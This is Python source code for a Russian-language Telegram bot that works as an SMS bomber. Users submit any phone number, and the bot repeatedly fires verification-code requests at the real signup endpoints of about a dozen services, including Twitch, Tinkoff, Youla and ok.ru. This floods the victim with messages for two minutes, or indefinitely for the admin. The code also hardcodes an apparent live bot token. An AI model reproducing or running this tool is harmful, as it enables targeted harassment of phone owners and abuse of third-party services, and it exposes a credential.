
import requests
import threading
from datetime import datetime, timedelta
from telebot import TeleBot
import telebot
import time
import random
from telebot import types

TOKEN = '1652824738:AAEmi-9Y8KFCMGWt4w9AiwlDQBE37B9bcM4'
types = telebot.types
THREADS_LIMIT = 200

chat_ids_file = 'chat_ids.txt'

ADMIN_CHAT_ID = 1115888142

users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
bot = telebot.TeleBot("1652824738:AAEmi-9Y8KFCMGWt4w9AiwlDQBE37B9bcM4")
running_spams_per_chat_id = []

print('Bot has started! You can use him.')

def save_chat_id(chat_id):
    "Функция добавляет чат айди в файл если его там нету"
    chat_id = str(chat_id)
    with open(chat_ids_file,"a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id not in ids_list:
            ids_file.write(f'{chat_id}\n')
            ids_list.append(chat_id)
            print(f'New chat_id saved: {chat_id}')
        else:
            print(f'chat_id {chat_id} is already saved')
        users_amount[0] = len(ids_list)
    return


def send_message_users(message):

    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post('https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(chat_ids_file, "r") as ids_file:
        ids_list = [line.split('\n')[0] for line in ids_file]

    [send_message(chat_id) for chat_id in ids_list]
    bot.send_message(ADMIN_CHAT_ID, "сообщение успешно отправлено всем ({users_amount[0]}) пользователям бота!")


@bot.message_handler(commands=['start'])
def start(message):
    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    boom = types.KeyboardButton(text='🥶Флуд Смс')
    stop = types.KeyboardButton(text='Остановить флуд')
    info = types.KeyboardButton(text='🤖Информация')
    stats = types.KeyboardButton(text='📈Статистика')
    faq = types.KeyboardButton(text='❗️ FAQ / Соглашение')

    buttons_to_add = [boom, stop, info, stats, faq]

    if int(message.chat.id) == ADMIN_CHAT_ID:
        buttons_to_add.append(types.KeyboardButton(text='🔥Рассылка'))
        buttons_to_add.append(types.KeyboardButton(text='addbl'))
        buttons_to_add.append(types.KeyboardButton(text='delbl'))

    keyboard.add(*buttons_to_add)
    bot.send_message(message.chat.id, f'Добро пожаловать🙋‍♂!\n\n<b>В данном боте ты сможешь зафлудить любой номер телефона!</b>\n\n<b>Выберите действие:</b>',  reply_markup=keyboard, parse_mode='HTML')
    save_chat_id(message.chat.id)

iteration = 0
_name = ''
for x in range(12):
    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

def send_for_number(phone):
        request_timeout = 0.00001
        iteration = 0
        _email = _name+f'{iteration}'+'@gmail.com'
        email = _name+f'{iteration}'+'@gmail.com'
        _phone = phone
        formatted_phone = phone
        _phone9 = _phone[1:]
        _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
        _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
        _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
        _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
        _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
        while True:
            time.sleep(3)
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
            requests.post("https://lenta.com/api/v1/authentication/requestValidationCode", json={"phone": "+" + _phone})
            requests.post("https://dostavista.ru/backend/send-verification-sms", data={"phone": _phone})
            requests.post(
                    "https://api.mtstv.ru/v1/users", json={"msisdn": _phone}, headers={}
                )
            requests.post(
                    "https://youla.ru/web-api/auth/request_code", data={"phone": _phone}
                )
        
            iteration += 1

@bot.message_handler(commands=["addbl"])
def addbl(message):
    try:
        if message.chat.id == ADMIN_CHAT_ID:
            newloser = f'{message.text[7:]}'
            if newloser == '':
                bot.send_message(ADMIN_CHAT_ID, "Введите номер id пользователя")
            else:
                f = open('idBL.txt' , 'a')
                f.write(f'{newloser}' + '\n')
                f.close()
                bot.send_message(ADMIN_CHAT_ID, "Добавлен новый пользователь в черный лист: "+f'{newloser}')
        else:
            bot.send_message(message.chat.id, "Доступно только админу")
    except:
        pass

@bot.message_handler(commands=['delbl'])
def delbl(message):
    try:
        if message.chat.id == ADMIN_CHAT_ID:
            idunban = f'{message.text[7:]}'
            with open("idBL.txt") as file:
                arrayBL = [row.strip() for row in file]
                if idunban == '':
                    bot.send_message(ADMIN_CHAT_ID, "Введите id пользователя.")
                elif idunban in arrayBL:
                    sss = open('idBL.txt', 'r').read().replace(f'{idunban}', '')
                    f = open('idBL.txt', 'w')
                    f.write(sss)
                    f.close()
                    bot.send_message(ADMIN_CHAT_ID, 'Готово.')
                else:
                    bot.send_message(ADMIN_CHAT_ID, 'Такого юзера не найдено')
        else:
            bot.send_message(message.chat.id, "Доступно только админу")
    except:
        pass

def start_spam(chat_id, phone_number, force):
    running_spams_per_chat_id.append(chat_id)

    bot.send_message(chat_id, "Проверяем черный список...")
    with open("idBL.txt") as file:
        arrayBL = [row.strip() for row in file]
        iduser = f'{chat_id}'
    if iduser in arrayBL:
        bot.send_message(chat_id, "Вы в черном листе!\nЕсли Вы считаете, что бан был получен случайно - обращайтесь к @san_riched.\nВот Ваш id, он пригодится админу: <b>"+f'{chat_id}'+"</b>", parse_mode="HTML")
    else:
        bot.send_message(ADMIN_CHAT_ID, f"{chat_id} отправил спам на {phone_number}", parse_mode='HTML')


    bot.send_message(chat_id, f'<b>👨‍💻Номер телефона: {phone_number}\n🙈Таймер: 2 минуты\n😄Спам успешно начался!</b>\n\nВ конце, вам придет отчет о спаме.', parse_mode='HTML')
    end = datetime.now() + timedelta(minutes = 2)
    while (datetime.now() < end) or (force and chat_id==ADMIN_CHAT_ID):
        if chat_id not in running_spams_per_chat_id:
            break
        send_for_number(phone_number)
    bot.send_message(chat_id, f'<b>Спам на номер {phone_number} завершён</b>', parse_mode='HTML')
    THREADS_AMOUNT[0] -= 1 # стояло 1
    try:
        running_spams_per_chat_id.remove(chat_id)
    except Exception:
        pass

def spam_handler(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(chat_id, 'Вы уже начали рассылку спама. Дождитесь окончания или нажмите Остановить спам и поробуйте снова')
        return

    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        x = threading.Thread(target=start_spam, args=(chat_id, phone, force))
        threads.append(x)
        THREADS_AMOUNT[0] += 1
        x.start()
    else:
        bot.send_message(chat_id, 'Сервера сейчас перегружены. Попытайтесь снова через несколько минут.')
        print('Максимальное количество тредов исполняется. Действие отменено.')

@bot.message_handler(content_types=['text'])
def handle_message_received(message):
    chat_id = int(message.chat.id)
    text = message.text

    if text == '🤖Информация':
        bot.send_message(chat_id, 'Создатель бота: @asov95\n<b>callcmcbomberbot\n\nПо вопросам сотрудничества обращаться в ЛС к создателю бота\n\n Канал создателя скрипта: @asov95</b>', parse_mode='HTML')

    elif text == '🥶Флуд Смс':
        bot.send_message(chat_id, '<b>Введите номер без + в формате:\n🇺🇦 380xxxxxxxxx\n🇷🇺 79xxxxxxxxx\n🇰🇿 77xxxxxxxxx\n🇧🇾 375xxxxxxxxx</b>', parse_mode='HTML')

    elif text == '📈Статистика':
        bot.send_message(chat_id, f'📊Статистика отображается в реальном времени📡!\nПользователей🙎‍♂: {users_amount[0]}<b>\nОбщее кол-во сервисов: 67\nБот запущен: 04.02.2020</b>', parse_mode='HTML')

    elif text == '🔥Рассылка' and chat_id==ADMIN_CHAT_ID:
        bot.send_message(chat_id, 'Введите сообщение в формате: "РАЗОСЛАТЬ: ваш_текст" без кавычек')

    elif text == '❗️ FAQ / Соглашение':
        bot.send_message(chat_id, 'Вы автоматически отвечаете за свои действия с этим ботом. Мы не несем ответственности, только тестирование! Спасибо за внимание.')

    elif text == 'Остановить флуд':
        if chat_id not in running_spams_per_chat_id:
            bot.send_message(chat_id, 'Флуд еще не начинался')
        else:
            running_spams_per_chat_id.remove(chat_id)

    elif text == 'addbl':
        addbl(message)

    elif text == 'delbl':
        delbl(message)

    elif 'РАЗОСЛАТЬ: ' in text and chat_id==ADMIN_CHAT_ID:
        msg = text.replace("РАЗОСЛАТЬ: ","")
        send_message_users(msg)

    elif len(text) == 11:
        phone = text
        spam_handler(phone, chat_id, force=False)

    elif len(text) == 12:
        phone = text
        spam_handler(phone, chat_id, force=False)

    elif len(text) == 12 and chat_id==ADMIN_CHAT_ID and text[0]=='_':
        phone = text[1:]
        spam_handler(phone, chat_id, force=True)

    else:
        bot.send_message(chat_id, f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')
        print(f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')

if __name__ == '__main__':
    bot.polling(none_stop=True)

